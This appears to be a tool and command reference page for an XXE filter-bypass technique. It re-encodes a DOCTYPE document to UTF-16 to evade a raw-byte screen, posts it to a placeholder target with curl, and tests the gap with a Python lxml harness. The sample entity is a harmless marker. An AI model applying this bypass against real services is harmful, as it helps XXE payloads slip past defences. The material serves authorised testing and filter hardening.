# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`xxe-parser-differential-bypass`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `iconv` | `iconv -f UTF-8 -t UTF-16LE probe.xml > probe-utf16.xml` | Re-encode a blocked DOCTYPE document to test a charset differential against the screen | Linux, macOS |
| `xmllint` | `xmllint --noout --xinclude --nonet probe.xml` | Check whether the parser honours xi:include independently of DOCTYPE handling | Linux, macOS |
| `curl` | `curl -sS -X POST --data-binary @probe-utf16.xml -H 'Content-Type: application/xml' https://target.example/parse` | Submit the re-encoded document to see whether it passes the filter and still parses | Cross-platform |

## Minimal Script Shape

A differential harness: it screens a document with a raw-byte DOCTYPE check, then feeds the same bytes re-encoded as UTF-16 to a decoding parser, reporting the gap.

```python
from lxml import etree

UTF8 = b"<!DOCTYPE d [<!ENTITY m 'xxepd-marker'>]><d>&m;</d>"
UTF16 = UTF8.decode("utf-8").encode("utf-16")  # BOM + 2-byte units


def screen_blocks(raw):
    return b"<!DOCTYPE" in raw   # naive raw-byte check


def parser_sees_doctype(raw):
    try:
        root = etree.fromstring(raw, etree.XMLParser(resolve_entities=True,
                                                     load_dtd=True))
        return "xxepd-marker" in (root.text or "")
    except etree.XMLSyntaxError:
        return False


bypass = (not screen_blocks(UTF16)) and parser_sees_doctype(UTF16)
print({"utf8_blocked": screen_blocks(UTF8),
       "utf16_passes_screen": not screen_blocks(UTF16),
       "differential_bypass": bypass})
```
